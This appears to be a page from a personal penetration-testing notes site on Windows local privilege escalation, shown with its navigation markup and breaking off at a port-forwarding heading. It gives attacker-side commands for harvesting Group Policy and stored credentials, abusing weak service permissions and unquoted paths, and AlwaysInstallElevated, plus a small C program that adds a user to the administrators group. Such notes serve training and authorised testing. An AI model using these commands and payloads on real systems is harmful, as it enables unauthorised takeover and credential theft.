    <li class="md-nav__item">
      <a href="../../../cryptography/client_certificate_tests/" class="md-nav__link">
        Client Certificate Tests
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_23" type="checkbox" id="__nav_23" >
      
      
      
      
        <label class="md-nav__link" for="__nav_23">
          Random Tips and Tricks
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Random Tips and Tricks" data-md-level="1">
        <label class="md-nav__title" for="__nav_23">
          <span class="md-nav__icon md-icon"></span>
          Random Tips and Tricks
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../random_tips_and_tricks/general_tips/" class="md-nav__link">
        Tips and Tricks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../random_tips_and_tricks/setuid_c-code/" class="md-nav__link">
        Setuid With C
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../random_tips_and_tricks/port_knocking/" class="md-nav__link">
        Port Knocking
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../random_tips_and_tricks/port_forwarding_and_tunneling/" class="md-nav__link">
        Port Forwarding and Tunneling
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../random_tips_and_tricks/pivoting/" class="md-nav__link">
        Pivoting
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_24" type="checkbox" id="__nav_24" >
      
      
      
      
        <label class="md-nav__link" for="__nav_24">
          Tools
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Tools" data-md-level="1">
        <label class="md-nav__title" for="__nav_24">
          <span class="md-nav__icon md-icon"></span>
          Tools
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../tools/wireshark/" class="md-nav__link">
        Wireshark
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../tools/wget/" class="md-nav__link">
        Wget
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../tools/webshell/" class="md-nav__link">
        Webshells
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../tools/gdb/" class="md-nav__link">
        GDB
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#basic-enumeration-of-the-system" class="md-nav__link">
    Basic Enumeration of the System
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#1-group-policy-preference" class="md-nav__link">
    1. Group Policy Preference
  </a>
  
    <nav class="md-nav" aria-label="1. Group Policy Preference">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-powersploit" class="md-nav__link">
    Using PowerSploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-metasploit" class="md-nav__link">
    Using Metasploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#manually" class="md-nav__link">
    Manually
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-services-with-vulnerble-permissions" class="md-nav__link">
    2. Services with Vulnerble Permissions
  </a>
  
    <nav class="md-nav" aria-label="2. Services with Vulnerble Permissions">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#21-insecure-registry-permissions" class="md-nav__link">
    2.1 Insecure Registry Permissions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#22-insecure-service-permissions" class="md-nav__link">
    2.2 Insecure Service Permissions
  </a>
  
    <nav class="md-nav" aria-label="2.2 Insecure Service Permissions">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-powersploit-privesc" class="md-nav__link">
    Using PowerSploit - Privesc
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-accesschkexe" class="md-nav__link">
    Using accesschk.exe
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#manually_1" class="md-nav__link">
    Manually
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#23-insecure-service-filefolder-permissions" class="md-nav__link">
    2.3 Insecure Service File/folder permissions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powersploit-privescpowerup" class="md-nav__link">
    PowerSploit Privesc/PowerUp
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-unquoted-service-paths" class="md-nav__link">
    3. Unquoted Service Paths
  </a>
  
    <nav class="md-nav" aria-label="3. Unquoted Service Paths">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit-with-powersploit" class="md-nav__link">
    Exploit with PowerSploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#manually_2" class="md-nav__link">
    Manually
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-alwaysinstallelevated-install-new-program-as-privileged-user" class="md-nav__link">
    4. AlwaysInstallElevated - Install new program as privileged user
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-dll-hijacking" class="md-nav__link">
    5. DLL Hijacking
  </a>
  
    <nav class="md-nav" aria-label="5. DLL Hijacking">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#run-it-locally" class="md-nav__link">
    Run it locally
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-the-executable-and-check-for-loadlibrary-functions" class="md-nav__link">
    Check the executable and check for LoadLibrary functions.
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6-check-installed-software-for-exploits" class="md-nav__link">
    6. Check installed software for exploits
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#7-cleartext-passwords-stored-credentials" class="md-nav__link">
    7. Cleartext Passwords / Stored credentials
  </a>
  
    <nav class="md-nav" aria-label="7. Cleartext Passwords / Stored credentials">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#search-for-them" class="md-nav__link">
    Search for them
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#in-common-files" class="md-nav__link">
    In Common Files
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#in-registry" class="md-nav__link">
    In Registry
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-browser-creds" class="md-nav__link">
    Check browser creds
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#8-kernel-exploits" class="md-nav__link">
    8. Kernel exploits
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#service-only-available-from-inside" class="md-nav__link">
    Service only available from inside
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerable-drivers" class="md-nav__link">
    Vulnerable Drivers
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hot-potato" class="md-nav__link">
    Hot potato
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#scheduled-tasks-only-works-on-windows-2000xp2003" class="md-nav__link">
    Scheduled Tasks - Only works on Windows 2000/xp/2003
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#escalate-to-system-from-administrator" class="md-nav__link">
    Escalate to SYSTEM from Administrator
  </a>
  
    <nav class="md-nav" aria-label="Escalate to SYSTEM from Administrator">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#on-windows-xp-and-older" class="md-nav__link">
    On Windows XP and Older
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vista-and-newer" class="md-nav__link">
    Vista and Newer
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kitrap" class="md-nav__link">
    Kitrap
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-metasploit_1" class="md-nav__link">
    Using Metasploit
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#post-modules" class="md-nav__link">
    Post modules
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  <a href="https://github.com/julianhal/notes/edit/master/docs/attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation.md" title="Edit this page" class="md-content__button md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
  </a>


<h1 id="privilege-escalation-windows">Privilege Escalation Windows<a class="headerlink" href="#privilege-escalation-windows" title="Permanent link">#</a></h1>
<p>We now have a low-privileges shell that we want to escalate into a privileged shell.</p>
<h2 id="basic-enumeration-of-the-system">Basic Enumeration of the System<a class="headerlink" href="#basic-enumeration-of-the-system" title="Permanent link">#</a></h2>
<p>Before we start looking for privilege escalation opportunities we need to understand a bit about the machine. We need to know what users have privileges. What patches/hotfixes the system has.</p>
<pre><code># Basics
systeminfo
hostname

# Who am I?
whoami
echo %username%

# What users/localgroups are on the machine?
net users
net localgroups

# More info about a specific user. Check if user has privileges.
net user user1

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain &lt;Group Name&gt;

# Firewall
netsh firewall show state
netsh firewall show config

# Network
ipconfig /all
route print
arp -A

# How well patched is the system?
wmic qfe get Caption,Description,HotFixID,InstalledOn
</code></pre>
<h2 id="1-group-policy-preference">1. Group Policy Preference<a class="headerlink" href="#1-group-policy-preference" title="Permanent link">#</a></h2>
<p>If the machine belongs to a domain and your user has access to <code>System Volume Information</code> there might be some sensitive files there.</p>
<p>This is the easiest technique, and the one that should be tried first.</p>
<p>First you need to find out which domain your user belongs to. You can do that by using the powershell Active directory module. If you do not have that module. See the helper-section to find out how to get it. You can do that with the following command:</p>
<pre><code class="language-powershell">get-addomain
</code></pre>
<pre><code>AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=hackdomain,DC=local
DeletedObjectsContainer            : CN=Deleted Objects,DC=hackdomain,DC=local
DistinguishedName                  : DC=hackdomain,DC=local
DNSRoot                            : hackdomain.local
DomainControllersContainer         : OU=Domain Controllers,DC=hackdomain,DC=local
DomainMode                         : Windows2012R2Domain
DomainSID                          : S-1-5-21-2900359584-3137434808-3022034389
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=hackdomain,DC=local
Forest                             : hackdomain.local
InfrastructureMaster               : DC1337.hackdomain.local
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=hackdomain,DC=local}
LostAndFoundContainer              : CN=LostAndFound,DC=hackdomain,DC=local
ManagedBy                          :
Name                               : hackdomain
NetBIOSName                        : HACKDOMAIN
ObjectClass                        : domainDNS
ObjectGUID                         : 176ed6af-a390-40f4-bbc2-e6f581089e90
ParentDomain                       :
PDCEmulator                        : DC1337.hackdomain.local
QuotasContainer                    : CN=NTDS Quotas,DC=hackdomain,DC=local
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {DC1337.hackdomain.local}
RIDMaster                          : DC1337.hackdomain.local
SubordinateReferences              : {DC=ForestDnsZones,DC=hackdomain,DC=local, DC=DomainDnsZones,DC=hackdomain,DC=loca
l, CN=Configuration,DC=hackdomain,DC=local}
SystemsContainer                   : CN=System,DC=hackdomain,DC=local
UsersContainer                     : CN=Users,DC=hackdomain,DC=local
</code></pre>
<p>So you can clearly see <code>hackdomain.local</code> references everywhere. This is the domain-name.</p>
<p>You can now go to <code>\\hackdomain.local\SYSVOL\hackdomain.local\policies</code> and search for passwords there. You can either go with the explorer or with powershell.</p>
<pre><code class="language-powershell">cd \\hackdomain.local\SYSVOL
findstr /r /s:cpassword 
</code></pre>
<h3 id="using-powersploit">Using PowerSploit<a class="headerlink" href="#using-powersploit" title="Permanent link">#</a></h3>
<p>You can use <code>Get-GPPPassword</code> from powersploit to get gpp-passwords.</p>
<pre><code>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-GPPPassword.ps1
</code></pre>
<p>You can also use <code>Get-CachedGPPPassword</code>. It is included in the PowerSploit Privesc module.</p>
<h3 id="using-metasploit">Using Metasploit<a class="headerlink" href="#using-metasploit" title="Permanent link">#</a></h3>
<pre><code>post/windows/gather/credentials/gpp
</code></pre>
<h3 id="manually">Manually<a class="headerlink" href="#manually" title="Permanent link">#</a></h3>
<p>First we need to map/mount that drive. In order to do that we need to know the IP-address of the domain controller. We can just look in the environment-variables</p>
<pre><code># Output environment-variables
set

# Look for the following:
LOGONSERVER=\\NAMEOFSERVER
USERDNSDOMAIN=WHATEVER.LOCAL

# Look up ip-addres
nslookup nameofserver.whatever.local

# It will output something like this
Address:  192.168.1.101

# Now we mount it
net use z: \\192.168.1.101\SYSVOL

# And enter it
z:

# Now we search for the groups.xml file
dir Groups.xml /s
</code></pre>
<p>If we find the file with a password in it, we can decrypt it like this in Kali</p>
<pre><code>gpp-decrypt encryptedpassword
</code></pre>
<pre><code>Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes
</code></pre>
<h2 id="2-services-with-vulnerble-permissions">2. Services with Vulnerble Permissions<a class="headerlink" href="#2-services-with-vulnerble-permissions" title="Permanent link">#</a></h2>
<p>Services on windows are programs that run in the background. Without a GUI. They are almost always started and run by NT Authority. Therefore the files, folder and registry keys need correct permissions.</p>
<h3 id="21-insecure-registry-permissions">2.1 Insecure Registry Permissions<a class="headerlink" href="#21-insecure-registry-permissions" title="Permanent link">#</a></h3>
<p>In Windows, information related to services is stored in <code>HKLM\SYSTEM\CurrentControlSet\Services</code> registry key. If we want to see information about a specific service, you can check <code>HKLM\SYSTEM\ControlSet001\Services\Vulnerable Service</code>.
In that registry there is a key called <code>ImagePath</code> which contains a UNC path to the executable. So if an attacker has the permission to edit that key, the attacker can change it to point to an executable of his/hers choice. You can check if the registry is editable from the command-line but you can also check if from regedit.exe.
It is uncommon that this key can be edited by a low priviliged user. But it is still something to test.</p>
<p>References:
https://pentestlab.blog/tag/imagepath/
https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</p>
<h3 id="22-insecure-service-permissions">2.2 Insecure Service Permissions<a class="headerlink" href="#22-insecure-service-permissions" title="Permanent link">#</a></h3>
<p>This attack is similar to the previous attack. But instead of changing the registry key we will change the Service-configuration.</p>
<p>First we need to know which services out user has the right to configure.
That can be done with the sysinternal tool accesschk.exe or with powersploit</p>
<h4 id="using-powersploit-privesc">Using PowerSploit - Privesc<a class="headerlink" href="#using-powersploit-privesc" title="Permanent link">#</a></h4>
<p>Enumerates all services and returns services for which the current user can modify the binPath.</p>
<pre><code>Get-ModifiableService


Set-ServiceBinaryPath 
</code></pre>
<h4 id="using-accesschkexe">Using accesschk.exe<a class="headerlink" href="#using-accesschkexe" title="Permanent link">#</a></h4>
<pre><code>accesschk.exe -uwcqv &quot;YourUser&quot; *
</code></pre>
<p>All services that "YourUser" can modify will be listed. SERVICE_ALL_ACCESS means we have full control over modifying the properties of Vulnerable Service.</p>
<p>For more details on how to actually change the binPath and restart the service see: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</p>
<h3 id="manually_1">Manually<a class="headerlink" href="#manually_1" title="Permanent link">#</a></h3>
<p>First we need to find services. That can be done using <code>wmci</code> or <code>sc.exe</code>. Wmci is not available on all windows machines, and it might not be available to your user. If you don't have access to it, you can use <code>sc.exe</code>.</p>
<p><strong>WMCI</strong></p>
<pre><code>wmic service list brief
</code></pre>
<p>This will produce a lot out output and we need to know which one of all of these services have weak permissions. In order to check that we can use the <code>icacls</code> program. Notice that <code>icacls</code> is only available from Vista and up. XP and lower has <code>cacls</code> instead.</p>
<p>As you can see in the command below you need to make sure that you have access to <code>wimc</code>, <code>icacls</code> and write privilege in <code>C:\windows\temp</code>.</p>
<pre><code class="language-cmd">for /f &quot;tokens=2 delims='='&quot; %a in ('wmic service list full^|find /i &quot;pathname&quot;^|find /i /v &quot;system32&quot;') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt

for /f eol^=^&quot;^ delims^=^&quot; %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls &quot;%a&quot;
</code></pre>
<p>Binaries in system32 are excluded since they are mostly correct, since they are installed by windows.</p>
<p><strong>sc.exe</strong></p>
<pre><code class="language-cmd">sc query state= all | findstr &quot;SERVICE_NAME:&quot; &gt;&gt; Servicenames.txt

FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt

FOR /F &quot;tokens=2 delims= &quot; %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt

FOR /F %i in (services.txt) DO @sc qc %i | findstr &quot;BINARY_PATH_NAME&quot; &gt;&gt; path.txt
</code></pre>
<p>Now you can process them one by one with the cacls command.</p>
<pre><code>cacls &quot;C:\path\to\file.exe&quot;
</code></pre>
<p><strong>Look for Weakness</strong></p>
<p>What we are interested in is binaries that have been installed by the user. In the output you want to look for <code>BUILTIN\Users:(F)</code>. Or where your user/usergroup has <code>(F)</code> or <code>(C)</code> rights.</p>
<p>Example:</p>
<pre><code>C:\path\to\file.exe 
BUILTIN\Users:F
BUILTIN\Power Users:C 
BUILTIN\Administrators:F 
NT AUTHORITY\SYSTEM:F
</code></pre>
<p>That means your user has write access. So you can just rename the <code>.exe</code> file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom.</p>
<p>Here is a POC code for getsuid.</p>
<pre><code class="language-c">#include &lt;stdlib.h&gt;
int main ()
{
int i;
    i = system(&quot;net localgroup administrators theusername /add&quot;);
return 0;
}
</code></pre>
<p>We then compile it with mingw like this:</p>
<pre><code class="language-bash">i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
</code></pre>
<p><strong>Restart the Service</strong></p>
<p>Okay, so now that we have a malicious binary in place we need to restart the service so that it gets executed. We can do this by using <code>wmic</code> or <code>net</code> the following way:</p>
<pre><code>wmic service NAMEOFSERVICE call startservice
</code></pre>
<pre><code>net stop [service name] &amp;&amp; net start [service name].
</code></pre>
<p>The binary should now be executed in the SYSTEM or Administrator context.</p>
<p><strong>Migrate the meterpreter shell</strong></p>
<p>If your meterpreter session dies right after you get it you need migrate it to a more stable service. A common service to migrate to is winlogon.exe since it is run by system and it is always run. You can find the PID like this:</p>
<pre><code>wmic process list brief | find &quot;winlogon&quot;
</code></pre>
<p>So when you get the shell you can either type <code>migrate PID</code> or automate this so that meterpreter automatically migrates.</p>
<p><a href="http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html">http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html</a></p>
<h3 id="23-insecure-service-filefolder-permissions">2.3 Insecure Service File/folder permissions<a class="headerlink" href="#23-insecure-service-filefolder-permissions" title="Permanent link">#</a></h3>
<p>If you find a service where the low-priv user has write permissions in the of the binary that is started by the service, the user can switch the binary to an evil binary and have that binary executed by NT Authroity.</p>
<h3 id="powersploit-privescpowerup">PowerSploit Privesc/PowerUp<a class="headerlink" href="#powersploit-privescpowerup" title="Permanent link">#</a></h3>
<p>The easiest way to find these vulnerabilities is with the Powersploit.</p>
<p>Download the PowerSploit module Privesc. Unzip it and place the entire Privesc folder in the Documents folder of your user:
<code>\Documents\WindowsPowerShell\Modules\Privesc\</code>
Here you can download it:
https://github.com/PowerShellMafia/PowerSploit/tree/dev/Privesc</p>
<p>In order to import the module the easiest is to do the following in a powershell shell:</p>
<pre><code>powershell.exe  -Exec bypass
import-module Privesc
# Check that it worked
get-command -Module Privesc
</code></pre>
<p>Now you can either run all checks to check all privesc possibilities. Or just check weak services with:</p>
<pre><code>invoke-AllChecks
</code></pre>
<p>Now check for the output from Services-delen. If you have a domain-user check for files where the usergroup <code>NT/Authenticated users</code> can write files. If youy user can't restart the service you will have to restart the machine. </p>
<h2 id="3-unquoted-service-paths">3. Unquoted Service Paths<a class="headerlink" href="#3-unquoted-service-paths" title="Permanent link">#</a></h2>
<p>So the idea here is that if the path to a service binary/executable is (1) not surounded by quotation-marks (""), and the  and the attacker has write-permissions on 
The basic idea is to make a service execute a malicious binary when it is started. For this to work the following conditions must be met:
1. The UNC path must not be sourounded by quotes "".
2. The path must contain a space, for example <code>\windows\my files\test.exe</code>.
3. The attacker must have write-permissions the directory with space in the name. So in the case it must have write permissions in <code>\my files\</code>.</p>
<p>The PATH to the service binary is set in the registry. </p>
<h3 id="exploit-with-powersploit">Exploit with PowerSploit<a class="headerlink" href="#exploit-with-powersploit" title="Permanent link">#</a></h3>
<pre><code>Get-UnquotedService
</code></pre>
<h3 id="manually_2">Manually<a class="headerlink" href="#manually_2" title="Permanent link">#</a></h3>
<p><strong>Find Services With Unquoted Paths</strong></p>
<pre><code># Using WMIC
wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;

# Using sc
sc query
sc qc service name

# Look for Binary_path_name and see if it is unquoted.
</code></pre>
<p>If the path contains a space and is not quoted, the service is vulnerable.</p>
<p><strong>Exploit It</strong></p>
<p>If the path to the binary is:</p>
<pre><code>c:\Program Files\something\winamp.exe
</code></pre>
<p>We can place a binary like this</p>
<pre><code>c:\program.exe
</code></pre>
<p>When the program is restarted it will execute the binary <code>program.exe</code>, which we of course control. We can do this in any directory that has a space in its name. Not only <code>program files</code>.</p>
<p>This attack is explained here:<br />
<a href="http://toshellandback.com/2015/11/24/ms-priv-esc/">http://toshellandback.com/2015/11/24/ms-priv-esc/</a></p>
<p>There is also a metasploit module for this is: exploit/windows/local/trusted_service_path</p>
<h2 id="4-alwaysinstallelevated-install-new-program-as-privileged-user">4. AlwaysInstallElevated - Install new program as privileged user<a class="headerlink" href="#4-alwaysinstallelevated-install-new-program-as-privileged-user" title="Permanent link">#</a></h2>
<p>This is a pretty simple privilege escalation attack. If this registry key is set a user is able to install any program. And when it is installed, it is installed as administrator. This means that if the attacker creates a install-package, .msi file, and then clicks on it, the package will be installed by the administrator/NT Authority. So if the attacker creates a install-package that adds a new privilege user the new user will be created. </p>
<p>Check to see if the registry key is set:</p>
<pre><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

Or
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

</code></pre>
<p><a href="http://toshellandback.com/2015/11/24/ms-priv-esc/">http://toshellandback.com/2015/11/24/ms-priv-esc/</a></p>
<p>Exploit it using PowerUp.ps1</p>
<pre><code>Write-UserAddMSI
</code></pre>
<p>This will create an isntallation-file on the desktop. Once you click that you get a dialog where you can enter the new user and password you would like to create. It then gets created when you continue the installation.</p>
<h2 id="5-dll-hijacking">5. DLL Hijacking<a class="headerlink" href="#5-dll-hijacking" title="Permanent link">#</a></h2>
<p>First check what services are running.
Second, check if those services are running as LocalSystem.
Third, check that the service is not a windows default service.
Fourth, check if you have any directory in the PATH variable that you have write-permissions to.</p>
<p>Now that you have enumerated the custom services that are running we need to find out if they load any DLL:s that doesn't exist.</p>
<h3 id="run-it-locally">Run it locally<a class="headerlink" href="#run-it-locally" title="Permanent link">#</a></h3>
<p>One way is to install the program locally on a computer where you are Administrator. You can run procmon at the same time, so that you can check what DLL:s it is trying to load.</p>
<h3 id="check-the-executable-and-check-for-loadlibrary-functions">Check the executable and check for LoadLibrary functions.<a class="headerlink" href="#check-the-executable-and-check-for-loadlibrary-functions" title="Permanent link">#</a></h3>
<p>I have never tried this tool, so who knows.
There is a tool for this:
https://github.com/Cybereason/siofra</p>
<p>Otherwise you can maybe search for strings in the binary, take all the DLL:s that you find that it is invoking. Whether it exists or not. And then you create a malicios DLL and copy it to every name of the files you find when you searched for strings in the binary.</p>
<p>No good method for it if you can't use Procmon. Read this
https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</p>
<h2 id="6-check-installed-software-for-exploits">6. Check installed software for exploits<a class="headerlink" href="#6-check-installed-software-for-exploits" title="Permanent link">#</a></h2>
<p>Check what programs are installed on the machine, and google to to see if any of them contains local privilege escalations.</p>
<h2 id="7-cleartext-passwords-stored-credentials">7. Cleartext Passwords / Stored credentials<a class="headerlink" href="#7-cleartext-passwords-stored-credentials" title="Permanent link">#</a></h2>
<h3 id="search-for-them">Search for them<a class="headerlink" href="#search-for-them" title="Permanent link">#</a></h3>
<pre><code>findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin &quot;password&quot; *.*
findstr /spin &quot;password&quot; *.*
</code></pre>
<h3 id="in-common-files">In Common Files<a class="headerlink" href="#in-common-files" title="Permanent link">#</a></h3>
<p>These are common files to find them in. They might be base64-encoded. So look out for that.</p>
<pre><code>c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
</code></pre>
<h3 id="in-registry">In Registry<a class="headerlink" href="#in-registry" title="Permanent link">#</a></h3>
<pre><code># VNC
reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;

# Windows autologin
reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;

# SNMP Paramters
reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;

# Putty
reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
</code></pre>
<h3 id="check-browser-creds">Check browser creds<a class="headerlink" href="#check-browser-creds" title="Permanent link">#</a></h3>
<p>So if you gotten access to a machine as another user. You can check to see if that user has stored credentials in the browser.</p>
<p>USe the following metasploit module:</p>
<pre><code>run post/windows/gather/enum_chrome
run post/multi/gather/firefox_creds
</code></pre>
<h2 id="8-kernel-exploits">8. Kernel exploits<a class="headerlink" href="#8-kernel-exploits" title="Permanent link">#</a></h2>
<p>Kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine.</p>
<p>Identify the hotfixes/patches</p>
<pre><code class="language-bash">systeminfo
# or
wmic qfe get Caption,Description,HotFixID,InstalledOn
</code></pre>
<p><strong>Python to Binary</strong></p>
<p>If we have an exploit written in python but we don't have python installed on the victim-machine we can always transform it into a binary with pyinstaller. Good trick to know.</p>
<h2 id="service-only-available-from-inside">Service only available from inside<a class="headerlink" href="#service-only-available-from-inside" title="Permanent link">#</a></h2>
<p>Sometimes there are services that are only accessible from inside the network. For example a MySQL server might not be accessible from the outside, for security reasons. It is also common to have different administration applications that is only accessible from inside the network/machine. Like a printer interface, or something like that. These services might be more vulnerable since they are not meant to be seen from the outside.</p>
<pre><code>netstat -ano
</code></pre>
<p>Example output:</p>
<pre><code>Proto  Local address      Remote address     State        User  Inode  PID/Program name
    -----  -------------      --------------     -----        ----  -----  ----------------
    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -
    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -
    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -
    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -
    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -
    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -
    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -
    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -
</code></pre>
<p>Look for <strong>LISTENING/LISTEN</strong>. Compare that to the scan you did from the outside.<br />
Does it contain any ports that are not accessible from the outside?</p>
<p>If that is the case, maybe you can make a remote forward to access it.</p>
<pre><code># Port forward using plink
